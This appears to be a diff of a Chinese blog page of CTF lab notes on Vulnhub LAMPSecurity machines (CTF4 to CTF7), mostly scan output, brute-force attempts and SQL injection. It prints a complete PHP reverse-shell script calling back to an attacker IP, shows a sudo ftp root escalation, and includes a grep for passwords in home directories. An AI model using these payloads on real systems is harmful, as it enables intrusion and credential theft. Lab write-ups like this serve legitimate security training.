class="line">如果以上方法都无法解决问题，你可以考虑更新你的SSH客户端到最新版本，以支持更安全的主机密钥类型。请参考之前的回答中关于如何更新SSH客户端的说明。</span><br></pre></td></tr></table></figure>
+
+<p>解决：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ ssh -oKexAlgorithms=+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms=+ssh-rsa,ssh-dss  dstevens@192.168.222.142</span><br><span class="line">The authenticity of host &#x27;192.168.222.142 (192.168.222.142)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:NDWh6/414mOsW4P7K6ICc5R67PrX87ADMFUx9DK9ftk.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.222.142&#x27; (RSA) to the list of known hosts.</span><br><span class="line">BSD SSH 4.1</span><br><span class="line">dstevens@192.168.222.142&#x27;s password: </span><br><span class="line">Last login: Wed Mar 11 09:45:34 2009</span><br><span class="line">[dstevens@ctf4 ~]$ ftp</span><br><span class="line">ftp&gt; !ls</span><br><span class="line">Desktop  html  install.log  mail  software</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">dstevens</span><br><span class="line">ftp&gt; !/bin/bash</span><br><span class="line">[dstevens@ctf4 ~]$ sudo ftp</span><br><span class="line">Password:</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; </span><br></pre></td></tr></table></figure>
+
+<p>这个是遇到的最简单的了，主要难度还是ssh登录的配置</p>
+<h2 id="lampCTF5"><a href="#lampCTF5" class="headerlink" title="lampCTF5"></a>lampCTF5</h2><p>扫描发现服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap -sN -sV -O   -p22,25,80,110,111,139,143,445,901,3306  192.168.222.143</span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:55 EDT</span><br><span class="line">Nmap scan report for 192.168.222.143</span><br><span class="line">Host is up (0.00031s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)</span><br><span class="line">25/tcp   open  smtp        Sendmail 8.14.1/8.14.1</span><br><span class="line">80/tcp   open  http        Apache httpd 2.2.6 ((Fedora))</span><br><span class="line">110/tcp  open  pop3        ipop3d 2006k.101</span><br><span class="line">111/tcp  open  rpcbind     2-4 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">143/tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)</span><br><span class="line">445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)</span><br><span class="line">901/tcp  open  http        Samba SWAT administration server</span><br><span class="line">3306/tcp open  mysql       MySQL 5.0.45</span><br><span class="line">MAC Address: 00:0C:29:DC:88:B2 (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 2.6.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:2.6</span><br><span class="line">OS details: Linux 2.6.9 - 2.6.30</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: Hosts: localhost.localdomain, 192.168.222.143; OS: Unix</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.45 seconds</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">┌──(kali㉿kali)-[~/Desktop]</span><br><span class="line">└─$ sudo nmap --script=vuln -p22,25,80,110,111,139,143,445,901,3306  192.168.222.138</span><br><span class="line">[sudo] password for kali: </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-12 08:12 EDT</span><br><span class="line">Pre-scan script results:</span><br><span class="line">| broadcast-avahi-dos: </span><br><span class="line">|   Discovered hosts:</span><br><span class="line">|     224.0.0.251</span><br><span class="line">|   After NULL UDP avahi packet DoS (CVE-2011-1002).</span><br><span class="line">|_  Hosts are all up (not vulnerable).</span><br><span class="line">Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn</span><br><span class="line">Nmap done: 1 IP address (0 hosts up) scanned in 35.81 seconds</span><br></pre></td></tr></table></figure>
+
+<p>信息收集：</p>
+<p>22试下能ssh爆破不（一般不太行，ladon跑，干其他事情）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Start: 2023-04-12 20:21:51</span><br><span class="line">PC Name: PENETRATION Lang: zh-CN</span><br><span class="line">Runtime: .net 4.0  ME: x64 OS: x64</span><br><span class="line">Found: Runtime .net 4.8.4084.0</span><br><span class="line">OS Name: Microsoft Windows 10 专业工作站版</span><br><span class="line">Machine Make: VMware, Inc.</span><br><span class="line">Network: IS Connected</span><br><span class="line">RunUser: Anonymous PR: -IsUser</span><br><span class="line">PID: 5624  CurrentProcess: Ladon911</span><br><span class="line">CPU: Physical: 2 Cores: 4 Logical: 4</span><br><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Use DefaultPwd</span><br><span class="line">load SshScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 22      Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:21:56</span><br></pre></td></tr></table></figure>
+
+<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ ssh -oKexAlgorithms&#x3D;+diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1  -oHostKeyAlgorithms&#x3D;+ssh-rsa,ssh-dss <a href="mailto:&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#50;&#50;&#50;&#46;&#49;&#52;&#51;">&#x72;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#x2e;&#49;&#54;&#x38;&#46;&#50;&#50;&#50;&#46;&#49;&#52;&#51;</a><br>The authenticity of host ‘192.168.222.143 (192.168.222.143)’ can’t be established.<br>RSA key fingerprint is SHA256:my5mjHup9LZ8CG0KCcvRNwYyvbuVrZI5nfKF7N1XjcU.<br>This key is not known by any other names.<br>Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yes<br>Warning: Permanently added ‘192.168.222.143’ (RSA) to the list of known hosts.<br><a href="mailto:&#x72;&#111;&#111;&#x74;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#x32;&#50;&#x2e;&#x31;&#x34;&#51;">&#x72;&#111;&#111;&#x74;&#64;&#49;&#x39;&#x32;&#x2e;&#x31;&#54;&#x38;&#x2e;&#50;&#x32;&#50;&#x2e;&#x31;&#x34;&#51;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#114;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#50;&#x32;&#50;&#46;&#x31;&#52;&#51;">&#114;&#111;&#x6f;&#116;&#x40;&#49;&#57;&#50;&#46;&#49;&#54;&#x38;&#46;&#50;&#x32;&#50;&#46;&#x31;&#52;&#51;</a>‘s password:<br>Permission denied, please try again.<br><a href="mailto:&#114;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x32;&#50;&#50;&#46;&#x31;&#52;&#x33;">&#114;&#x6f;&#111;&#116;&#64;&#49;&#x39;&#50;&#x2e;&#49;&#x36;&#56;&#46;&#x32;&#50;&#50;&#46;&#x31;&#52;&#x33;</a>‘s password: </p>
+<p>看看能不能在哪个地方得到用户名</p>
+<p>3306看也能爆破一下不</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Only Scan Mysql Port!</span><br><span class="line">load MysqlScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 3306    Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:22:43</span><br></pre></td></tr></table></figure>
+
+<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ mysql -h 192.168.222.143 -u root -p123456                                                      1 ⨯<br>ERROR 1045 (28000): Access denied for user ‘root‘@’192.168.222.132’ (using password: YES)</p>
+<p>看80，25不知道干嘛的之后在管</p>
+<p>80：</p>
+<p>使用nikto+dirb</p>
+<h2 id="┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6"><a href="#┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6" class="headerlink" title="┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nikto -url  http://192.168.222.143- Nikto v2.1.6"></a>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ nikto -url  <a target="_blank" rel="noopener" href="http://192.168.222.143/">http://192.168.222.143</a><br>- Nikto v2.1.6</h2><ul>
+<li>Target IP:          192.168.222.143</li>
+<li>Target Hostname:    192.168.222.143</li>
+<li>Target Port:        80</li>
+<li>Start Time:         2023-04-12 08:28:41 (GMT-4)</li>
+</ul>
+<hr>
+<ul>
+<li>Server: Apache&#x2F;2.2.6 (Fedora)</li>
+<li>Retrieved x-powered-by header: PHP&#x2F;5.2.4</li>
+<li>The anti-clickjacking X-Frame-Options header is not present.</li>
+<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
+<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
+<li>Apache&#x2F;2.2.6 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</li>
+<li>Allowed HTTP Methods: <strong>GET, HEAD, POST, OPTIONS, TRACE</strong> </li>
+<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
+<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
+<li>&#x2F;index.php: PHP include error may indicate local or remote file inclusion is possible.</li>
+<li>OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
+<li>OSVDB-3092: <strong>&#x2F;phpmyadmin&#x2F;changelog.php</strong>: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
+<li>Server may leak inodes via ETags, header found with file &#x2F;phpmyadmin&#x2F;ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</li>
+<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
+<li>Cookie SQMSESSID created without the httponly flag</li>
+<li>OSVDB-3093: &#x2F;mail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
+<li>OSVDB-3093: &#x2F;squirrelmail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
+<li>&#x2F;info.php: Output from the phpinfo() function was found.</li>
+<li>OSVDB-3233: &#x2F;info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
+<li>OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</li>
+<li>OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</li>
+<li>OSVDB-5292: <strong>&#x2F;info.php</strong>?file&#x3D;<a target="_blank" rel="noopener" href="http://cirt.net/rfiinc.txt">http://cirt.net/rfiinc.txt</a>?: RFI from RSnake’s list (<a target="_blank" rel="noopener" href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a target="_blank" rel="noopener" href="http://osvdb.org/">http://osvdb.org/</a> （<strong>phinfo界面，有敏感信息但没用</strong></li>
+<li>&#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found</li>
+<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
+<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
+<li>8724 requests: 0 error(s) and 26 item(s) reported on remote host</li>
+<li>End Time:           2023-04-12 08:29:06 (GMT-4) (25 seconds)</li>
+</ul>
+<hr>
+<ul>
+<li>1 host(s) tested</li>
+</ul>
+<p>三个地方登录注册：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">登录</span><br><span class="line">http://192.168.222.143/phpmyadmin/ （sql试了g</span><br><span class="line">http://192.168.222.143/mail/src/login.php （很卡这个</span><br><span class="line">/events/?q=node&amp;destination=node  （sql试了g</span><br><span class="line"></span><br><span class="line">注册</span><br><span class="line">http://192.168.222.143/list/</span><br><span class="line">[21:45:58] [WARNING] information_schema not available, back-end DBMS is MySQL &lt; 5. database names will be fetched from &#x27;mysql&#x27; database</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test&#x27;</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test\\_%&#x27;</span><br><span class="line">有sql注入但没东西，寄</span><br></pre></td></tr></table></figure>
+
+<p>感觉phpadmin是突破点，一个一个试：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">DIRECTORY: http://192.168.222.143/phpmyadmin/contrib/                                             </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                 </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/index.php (CODE:200|SIZE:8457)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/js/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/lang/                                                </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/libraries (CODE:403|SIZE:302)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/LICENSE (CODE:200|SIZE:18011)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/README (CODE:200|SIZE:2624)                                       </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/robots.txt (CODE:200|SIZE:26)                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/scripts/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/setup/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/themes/                                              </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/TODO (CODE:200|SIZE:235)  </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="http://192.168.222.143/phpmyadmin/contrib/">http://192.168.222.143/phpmyadmin/contrib/</a> ，phpmyadmin也没东西</p>
+<p>网页感觉没东西了：</p>
+<p>PORT     STATE SERVICE     VERSION<br>22&#x2F;tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)<br>25&#x2F;tcp   open  smtp        Sendmail 8.14.1&#x2F;8.14.1<br>80&#x2F;tcp   open  http        Apache httpd 2.2.6 ((Fedora))<br>110&#x2F;tcp  open  pop3        ipop3d 2006k.101<br>111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)<br>139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>143&#x2F;tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)<br>445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>901&#x2F;tcp  open  http        Samba SWAT administration server<br>3306&#x2F;tcp open  mysql       MySQL 5.0.45</p>
+<p>一个一个搜漏洞</p>
+<p>摆了。。</p>
+<p>直接上awvs，洞还不少。。。任意文件读取（地权限）、xss、sql</p>
+<p>试试cms漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NanoCMS</span><br></pre></td></tr></table></figure>
+
+<p>敏感信息泄露</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.1.111&quot;;</span><br><span class="line">$port = &quot;13123&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>grep -ir pass &#x2F;home&#x2F;* 2&gt;&#x2F;dev&#x2F;null </p>
+<p>得到root密码，结束</p>
+<h3 id="别人："><a href="#别人：" class="headerlink" title="别人："></a>别人：</h3><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/211939.html">CTF靶场系列-LAMPSecurity: CTF5 - FreeBuf网络安全行业门户</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/kengkeng123qwe/article/details/124802020">Vulnhub-CTF5靶机实战_vulnhub windows靶机_御七彩虹猫的博客-CSDN博客</a></p>
+<h2 id="CTF6"><a href="#CTF6" class="headerlink" title="CTF6"></a>CTF6</h2><p>还是比较简单（除了提权</p>
+<p>注意的是：</p>
+<p>最好在tmp下载利用脚本，改变权限，仔细看linux说明udev</p>
+<h2 id="CTF7"><a href="#CTF7" class="headerlink" title="CTF7"></a>CTF7</h2><p>信息收集：</p>
+<p>nmap、nessus、awvs、dirb、nikto</p>
+<p>得到目标ip：192.168.222.254</p>
+<p>漏洞探测：</p>
+<p>漏洞利用：</p>
+<p>提权：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230417194051405.png" alt="image-20230417194051405"></p>
+<p>找到一个用户能够直接sudo</p>
 
     </div>
 
@@ -387,7 +925,7 @@
       </ul>
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#W1R3S"><span class="nav-number">1.</span> <span class="nav-text">W1R3S</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap-%E6%89%AB%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.1.</span> <span class="nav-text">nmap 扫服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEftp"><span class="nav-number">1.2.</span> <span class="nav-text">访问ftp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEweb"><span class="nav-number">1.3.</span> <span class="nav-text">访问web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%EF%BC%9Adirb%E3%80%81gobuster%E3%80%81feroxbuster"><span class="nav-number">1.3.1.</span> <span class="nav-text">目录爆破：dirb、gobuster、feroxbuster</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.4.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarbas"><span class="nav-number">2.</span> <span class="nav-text">jarbas</span></a></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#W1R3S"><span class="nav-number">1.</span> <span class="nav-text">W1R3S</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap-%E6%89%AB%E6%9C%8D%E5%8A%A1"><span class="nav-number">1.1.</span> <span class="nav-text">nmap 扫服务</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEftp"><span class="nav-number">1.2.</span> <span class="nav-text">访问ftp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AE%BF%E9%97%AEweb"><span class="nav-number">1.3.</span> <span class="nav-text">访问web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9B%AE%E5%BD%95%E7%88%86%E7%A0%B4%EF%BC%9Adirb%E3%80%81gobuster%E3%80%81feroxbuster"><span class="nav-number">1.3.1.</span> <span class="nav-text">目录爆破：dirb、gobuster、feroxbuster</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81"><span class="nav-number">1.4.</span> <span class="nav-text">权限维持</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#jarbas"><span class="nav-number">2.</span> <span class="nav-text">jarbas</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sickos2"><span class="nav-number">3.</span> <span class="nav-text">sickos2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#v-%E2%80%93verbose-%E8%BE%93%E5%87%BA%E8%AF%A6%E7%BB%86%E5%86%85%E5%AE%B9"><span class="nav-number">4.</span> <span class="nav-text">#-v, –verbose                  输出详细内容</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prime-1"><span class="nav-number">5.</span> <span class="nav-text">prime 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#prime2"><span class="nav-number">6.</span> <span class="nav-text">prime2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lampCTF4"><span class="nav-number">7.</span> <span class="nav-text">lampCTF4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%87%AA%E5%B7%B1%EF%BC%9A"><span class="nav-number">7.1.</span> <span class="nav-text">自己：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#lampCTF5"><span class="nav-number">8.</span> <span class="nav-text">lampCTF5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%94%8C%E2%94%80%E2%94%80-kali%E3%89%BFkali-x2F-Desktop-%E2%94%94%E2%94%80-nikto-url-http-192-168-222-143-Nikto-v2-1-6"><span class="nav-number">9.</span> <span class="nav-text">┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nikto -url  http:&#x2F;&#x2F;192.168.222.143- Nikto v2.1.6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%AB%E4%BA%BA%EF%BC%9A"><span class="nav-number">9.1.</span> <span class="nav-text">别人：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CTF6"><span class="nav-number">10.</span> <span class="nav-text">CTF6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" 